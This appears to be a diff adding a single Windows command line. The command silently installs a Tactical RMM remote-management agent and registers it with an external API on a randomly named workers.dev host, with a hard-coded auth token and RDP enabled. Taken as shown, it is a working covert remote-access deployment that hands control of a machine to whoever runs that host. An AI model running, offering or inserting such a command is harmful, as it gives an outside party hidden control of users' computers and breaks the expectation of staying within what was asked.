@@ -1,0 +1,1 @@
+c:\programdata\tacticalagent-v2.4.4-windows-amd64.exe /VERYSILENT /SUPPRESSMSGBOXES && ping 127.0.0.1 -n 5 && "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://patient-fire-aa7d.urijbnnbp.workers.dev --client-id 1 --site-id 1 --agent-type workstation --auth 68ef40e335f5be114f555c33b2866581a3dfee35690dd99ff0272d0109bceb5e --rdp --ping
